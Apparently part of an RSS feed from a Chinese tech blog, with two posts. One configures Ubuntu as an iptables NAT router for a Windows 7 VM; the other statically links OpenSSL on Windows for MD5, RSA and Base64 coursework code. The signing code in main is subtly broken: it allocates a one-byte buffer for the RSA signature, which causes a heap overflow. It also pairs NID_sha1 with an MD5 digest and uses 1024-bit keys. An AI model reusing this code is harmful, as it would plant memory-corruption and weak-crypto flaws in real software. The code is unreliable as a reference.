]]></description></item><item><title>使用iptables将ubuntu配置为路由器</title><link>https://lgf.im/posts/linux/ubuntu-iptables-nat/</link><pubDate>Wed, 18 Mar 2020 13:15:40 +0000</pubDate><author/><guid>https://lgf.im/posts/linux/ubuntu-iptables-nat/</guid><description><![CDATA[<h2 id="实验环境">实验环境</h2>
<blockquote>
<p>使用 vmware 分别创建win7和ubuntu两个虚拟机</p>
</blockquote>
<h3 id="ubuntu-1804">ubuntu 18.04</h3>
<p>充当网关路由器</p>
<p>网卡1(WAN口)：桥接公网</p>
<p>网卡2(LAN口)：vmnet15</p>
<p></p>
<h3 id="win7">win7</h3>
<p>充当内网客户机</p>
<p>网卡：vmnet15</p>
<blockquote>
<p>vmnet15不使用vmware的配置，使用一个空的vmnet</p>
</blockquote>
<p></p>
<h2 id="ubuntu-配置">ubuntu 配置</h2>
<h3 id="开启ipv4-forward">开启ipv4 forward</h3>
<p>修改 <code>/etc/sysctl.conf</code> 开启ipv4的forward功能，将下面的注释打开，如果没有手动添加。</p>
<p></p>
<p><code>sysctl -p</code> 生效</p>
<h3 id="配置网卡信息">配置网卡信息</h3>
<p><code>ip addr</code> 查看所有网卡的名称和信息</p>
<p>ubuntu18.04使用netplan管理网络，修改其配置文件</p>
<p><code>sudo nano /etc/netplan/50-cloud-init.yaml</code></p>
<p></p>
<p>使用 <code>netplan try</code> 检查配置是否正确，如果正确自动应用生效</p>
<h3 id="配置iptables规则">配置iptables规则</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">//清空已有规则防止干扰
iptables -F

//进、出、转发默认允许
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

//将从子网网段来的连接nat到eno33网卡<span class="o">(</span>互联网<span class="o">)</span>，ip改为外网ip
iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -o eno33 -j SNAT --to-source 192.168.254.129

//添加伪装
iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -j MASQUERADE
</code></pre></td></tr></table>
</div>
</div><h2 id="win7-设置">win7 设置</h2>
<p>修改网卡配置如图</p>
<p></p>
<p>win7即可通过ubuntu这个网关上网</p>
]]></description></item><item><title>静态链接OpenSSL进行RSA\MD5\Base64</title><link>https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/</link><pubDate>Wed, 18 Mar 2020 12:50:10 +0000</pubDate><author/><guid>https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/</guid><description><![CDATA[<h2 id="简介">简介</h2>
<p>目标平台： Windows 10 amd64</p>
<p>使用静态链接方式，原因：动态链接库太大了，包含很多本次实验不需要的函数</p>
<h2 id="准备工作">准备工作</h2>
<h3 id="下载openssl代码">下载openssl代码</h3>
<p><code>git clone https://github.com/openssl/openssl.git</code></p>
<p>或者从官网 <a href="https://www.openssl.org/source/">https://www.openssl.org/source/</a> 下载源代码</p>
<p>我使用的是openssl 1.1.1</p>
<h3 id="安装perl环境这里使用的是activeperl">安装perl环境，这里使用的是ActivePerl</h3>
<p><a href="https://www.activestate.com/products/perl/">https://www.activestate.com/products/perl/</a></p>
<h3 id="安装nasm汇编器">安装NASM汇编器</h3>
<p><a href="https://www.nasm.us/">https://www.nasm.us/</a></p>
<h3 id="配置环境变量">配置环境变量</h3>
<p>将刚刚安装的nasm和perl的bin目录加入PATH</p>
<p></p>
<h2 id="编译-openssl-静态链接库">编译 openssl 静态链接库</h2>
<h3 id="初始化环境">初始化环境</h3>
<p>使用visual studio自带的命令提示工具初始化环境，因为需要使用nmake</p>
<p></p>
<p></p>
<h3 id="生成编译配置文件">生成编译配置文件</h3>
<p>cd进入openssl源码目录</p>
<p>执行 <code>perl Configure VC-WIN64A no-asm no-shared --prefix=&quot;D:\Project\opensslwork\openssl\build&quot; --openssldir=&quot;D:\Project\opensslwork\openssl\build\ssl&quot;</code></p>
<h3 id="进行编译并测试和安装">进行编译并测试和安装</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">nmake
nmake <span class="nb">test</span>
nmake install
</code></pre></td></tr></table>
</div>
</div><p>此时已经有了我们需要的头文件和静态链接lib库</p>
<p></p>
<p></p>
<h2 id="使用openssl的api进行编程">使用openssl的api进行编程</h2>
<h3 id="visual-studio项目配置">visual studio项目配置</h3>
<p>vs创建空项目，然后配置头文件和库文件的路径</p>
<p>项目右键-属性，配置选择所有配置，平台选择x64</p>
<p><code>VC++ 目录</code> 配置里面的 <code>包含目录</code> 添加openssl的头文件目录, 我这里是 <code>D:\Project\opensslwork\openssl\build\include;</code></p>
<p></p>
<p><code>链接器</code> 里面的 <code>输入</code> 的 <code>附加依赖项</code> 添加 静态库名，<code>libcrypto.lib;libssl.lib;</code></p>
<blockquote>
<p>注意：在使用openssl的静态链接库时，除了添加 <code>libcrypto.lib;libssl.lib;</code>，还需要添加系统的依赖库：<code>crypt32.lib;WS2_32.lib;</code>， 因为openssl在windows平台使用了这些库。
完整的： <code>kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies);crypt32.lib;libcrypto.lib;libssl.lib;WS2_32.lib;</code></p>
</blockquote>
<h3 id="添加头文件">添加头文件</h3>
<p>因为需要md5,rsa,base64等操作，这里需要导入openssl四个相关的头文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c++" data-lang="c++"><span class="cp">#include</span> <span class="cpf">&lt;openssl/rsa.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;openssl/pem.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;openssl/md5.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;openssl/bio.h&gt;</span><span class="cp">
</span></code></pre></td></tr></table>
</div>
</div><h3 id="使用md5对字符串生成摘要">使用MD5对字符串生成摘要</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c++" data-lang="c++"><span class="kt">int</span> <span class="nf">md5_hash</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">in</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">md</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">data</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">str</span><span class="p">;</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">in</span><span class="p">;</span>
    <span class="n">MD5</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">in</span><span class="p">),</span> <span class="n">md</span><span class="p">);</span> <span class="c1">//调用openssl的md5方法
</span><span class="c1"></span>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="生成rsa密钥对并以pem格式写入文件">生成rsa密钥对并以pem格式写入文件</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c++" data-lang="c++"><span class="n">RSA</span> <span class="o">*</span> <span class="nf">gen_rsa</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">bits</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>
    <span class="n">RSA</span><span class="o">*</span> <span class="n">rsa</span> <span class="o">=</span> <span class="n">RSA_new</span><span class="p">();</span>
    <span class="n">BIGNUM</span><span class="o">*</span> <span class="n">e</span> <span class="o">=</span> <span class="n">BN_new</span><span class="p">();</span>
    <span class="n">BN_set_word</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">RSA_F4</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">rc</span> <span class="o">=</span> <span class="n">RSA_generate_key_ex</span><span class="p">(</span><span class="n">rsa</span><span class="p">,</span> <span class="n">bits</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> <span class="c1">//openssl中生成rsa key的新方法
</span><span class="c1"></span>    <span class="n">BN_free</span><span class="p">(</span><span class="n">e</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">rc</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>   
    <span class="n">size_t</span> <span class="n">pri_len</span><span class="p">;</span>
    <span class="n">size_t</span> <span class="n">pub_len</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">pri_key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">pub_key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">BIO</span><span class="o">*</span> <span class="n">pubkey</span> <span class="o">=</span> <span class="n">BIO_new_file</span><span class="p">(</span><span class="s">&#34;public.pem&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>
    <span class="n">BIO</span><span class="o">*</span> <span class="n">prikey</span> <span class="o">=</span> <span class="n">BIO_new_file</span><span class="p">(</span><span class="s">&#34;private.pem&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>
    <span class="n">PEM_write_bio_RSAPrivateKey</span><span class="p">(</span><span class="n">prikey</span><span class="p">,</span> <span class="n">rsa</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> <span class="c1">//私钥写入文件
</span><span class="c1"></span>    <span class="n">PEM_write_bio_RSAPublicKey</span><span class="p">(</span><span class="n">pubkey</span><span class="p">,</span> <span class="n">rsa</span><span class="p">);</span> <span class="c1">//公钥写入文件
</span><span class="c1"></span>    <span class="k">return</span> <span class="n">rsa</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="对数据进行base64编码base64在bio中有">对数据进行base64编码，base64在BIO中有</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c++" data-lang="c++"><span class="kt">int</span> <span class="nf">base64_encode</span><span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">b64text</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">BIO</span><span class="o">*</span> <span class="n">bio</span><span class="p">,</span> <span class="o">*</span> <span class="n">b64</span><span class="p">;</span>
    <span class="n">BUF_MEM</span><span class="o">*</span> <span class="n">bufferPtr</span><span class="p">;</span>
    <span class="n">b64</span> <span class="o">=</span> <span class="n">BIO_new</span><span class="p">(</span><span class="n">BIO_f_base64</span><span class="p">());</span>
    <span class="n">bio</span> <span class="o">=</span> <span class="n">BIO_new</span><span class="p">(</span><span class="n">BIO_s_mem</span><span class="p">());</span>
    <span class="n">bio</span> <span class="o">=</span> <span class="n">BIO_push</span><span class="p">(</span><span class="n">b64</span><span class="p">,</span> <span class="n">bio</span><span class="p">);</span>
    <span class="n">BIO_set_flags</span><span class="p">(</span><span class="n">bio</span><span class="p">,</span> <span class="n">BIO_FLAGS_BASE64_NO_NL</span><span class="p">);</span>
    <span class="n">BIO_write</span><span class="p">(</span><span class="n">bio</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
    <span class="n">BIO_flush</span><span class="p">(</span><span class="n">bio</span><span class="p">);</span>
    <span class="n">BIO_get_mem_ptr</span><span class="p">(</span><span class="n">bio</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bufferPtr</span><span class="p">);</span>
    <span class="n">BIO_set_close</span><span class="p">(</span><span class="n">bio</span><span class="p">,</span> <span class="n">BIO_NOCLOSE</span><span class="p">);</span>
    <span class="o">*</span><span class="n">b64text</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">((</span><span class="n">bufferPtr</span><span class="o">-&gt;</span><span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">*</span><span class="n">b64text</span><span class="p">,</span> <span class="n">bufferPtr</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">bufferPtr</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>
    <span class="p">(</span><span class="o">*</span><span class="n">b64text</span><span class="p">)[</span><span class="n">bufferPtr</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
    <span class="n">BIO_free_all</span><span class="p">(</span><span class="n">bio</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="最后通过main函数读入字符串并将三个过程连起来">最后通过main函数读入字符串并将三个过程连起来</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c++" data-lang="c++"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;usage: work.exe </span><span class="se">\&#34;</span><span class="s">string to hash and sign</span><span class="se">\&#34;</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">str</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;your str: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>

    <span class="c1">// first md5(str)
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">md</span><span class="p">[</span><span class="n">MD5_DIGEST_LENGTH</span><span class="p">];</span>
    <span class="n">md5_hash</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">md</span><span class="p">);</span>

    <span class="c1">// then gen rsa pkey and sign the md
</span><span class="c1"></span>    <span class="n">RSA</span><span class="o">*</span> <span class="n">rsa</span> <span class="o">=</span> <span class="n">gen_rsa</span><span class="p">();</span>
    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">sig</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">siglen</span><span class="p">;</span>
    <span class="n">RSA_sign</span><span class="p">(</span><span class="n">NID_sha1</span><span class="p">,</span> <span class="n">md</span><span class="p">,</span> <span class="n">MD5_DIGEST_LENGTH</span><span class="p">,</span> <span class="n">sig</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">siglen</span><span class="p">,</span> <span class="n">rsa</span><span class="p">);</span>

    <span class="c1">// final base64(sig)
</span><span class="c1"></span>    <span class="kt">char</span><span class="o">*</span> <span class="n">b64text</span><span class="p">;</span>
    <span class="n">base64_encode</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">siglen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b64text</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">b64text</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>因为是课程作业，就没有对出现的错误情况进行处理，实际使用时需要考虑到</p>
</blockquote>
<h2 id="运行">运行</h2>
<h3 id="运行截图">运行截图</h3>
<p></p>
<h3 id="生成的私钥文件">生成的私钥文件</h3>
<p></p>
<h3 id="生成的公钥文件">生成的公钥文件</h3>
<p></p>
]]></description></item></channel></rss>